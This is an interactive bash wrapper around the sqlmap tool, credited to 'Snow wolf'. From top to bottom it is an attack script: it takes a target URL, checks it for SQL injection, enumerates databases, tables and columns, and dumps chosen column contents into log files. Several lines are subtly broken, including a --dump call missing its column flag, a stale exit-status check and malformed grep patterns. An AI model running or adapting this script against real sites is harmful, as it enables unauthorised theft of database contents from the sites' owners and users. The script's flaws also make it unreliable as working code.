#!/bin/bash
RED="\033[31m"
GREEN="\033[32m"
BLUE="\033[34m"
RESET="\033[0m"
SQLMAP_PATH=/usr/share/sqlmap/sqlmap.py
BASH=/bin/bash
echo  -e "$BLUE
 SSSSSS   QQQQQQQQ   LL     MM         MM     A      PPPPPP
SSSSSSSS QQQQQQQQQQ  LL     MMM       MMM    A A     P     P
SS       QQ      QQ  LL     M M       M M   A   A    P     P
SSSSSSSS QQ    Q QQ  LL     M  M     M  M  AAAAAAA   PPPPPP
      SS QQ     QQQ  LL     M   M   M   M A       A  P
SSSSSSSS  QQQQQQQQQ  LL     M    M M    MA         A P
 SSSSSS            Q LLLLLLLM     M     M            P
BY:Snow wolf
$RESET"
read -p 'please input injection point:' ZRD
echo -e  "[$BLUE General inspection..... $RESET]"
python $SQLMAP_PATH -u "$ZRD"  --batch &> sqlmap/log/log.txt &&  &> /dev/null &&  grep "Parameter: " sqlmap/log/log.txt &> /dev/null
if [ $? -eq 0 ]
then
	echo  -e "injection point:	[$GREEN OK $RESET]"
elif [ $? -ne 0 ]
then
	echo  -e "injection point:	[$RED FAIL $RESET]"
        
        $BASH sqlmap/snowwolf-sqlmap.sh
fi
read  -p 'do you look databases?(y/n):' DATABASES
case $DATABASES in
y | Y)echo
           echo -e  "[$BLUE DETECTION..... $RESET]" && python $SQLMAP_PATH -u "$ZRD" --batch --dbs &> sqlmap/log/databases.txt && &> /dev/null
           grep -v [[starting]] sqlmap/log/databases.txt  | tail -n10  | grep [*]
           echo -e  "[$GREEN databases ok $RESET]"
           ;;
n | N)echo
            echo  -e "[$RED No prompt help message $RESET]"
            exit 1
            ;;
esac
read  -p 'do you need look tables?(y/n):' TABLES
case $TABLES in
y | Y)echo
             read  -p 'please input database name:' DATA
             echo -e  "[$BLUE DETECTION..... $RESET]" && python $SQLMAP_PATH -u "$ZRD" --batch -D $DATA --tables &> sqlmap/log/tables.txt && &> /dev/null
             grep -v [[starting]] sqlmap/log/tables.txt  | tail -n40  | grep [\|]
             echo -e "[$GREEN TABLES OK $RESET]"
             ;;
n | N)echo
             echo  -e "$RED No prompt help message $RESET"
             exit 1
              ;;
esac
read -p 'do you look tables columns?(y/n):' COLUMN
case $COLUMN in
y | Y)echo
             read -p 'please input tables name:' TABLE_NAME
             echo -e  "[$BLUE DETECTION..... $RESET]" && python $SQLMAP_PATH -u "$ZRD" --batch -D $DATA -T $TABLE_NAME --columns &> sqlmap/log/columns.txt && &> /dev/null
             grep -v [[starting]] sqlmap/log/columns.txt  | tail -n20  | grep [\|]
             echo -e "$GREEN columns ok $RESET"
            ;;
n | N)echo
             echo -e "$RED NO prompt help message $RESET"
             exit 1
             ;;
esac
read -p 'do you want to check the contents of the table?(y/n):' DUMP_TABLE
case $DUMP_TABLE in
y | Y) echo
             read -p 'please input columns zhi1:' COLUMN_ZHI
             read -p 'please input columns zhi2:' COLUMN_ZHI2
             echo -e  "[$BLUE DETECTION..... $RESET]" && python $SQLMAP_PATH -u "$ZRD" --batch -D $DATA -T $TABLE_NAME  $COLUMN_ZHI,$COLUMN_ZHI2 --dump &> sqlmap/log/column_zhi.txt && &> /dev/null
            grep -v [[starting]] sqlmap/log/column_zhi.txt | tail -n20 | grep [\|]
            echo -e "$GREEN table ok $RESET"
            ;;
n | N)echo
             echo -e "$RED NO prompt help message $RESET"
             exit 1
             ;;
esac
$BASH sqlmap/snowwolf-sqlmap.sh
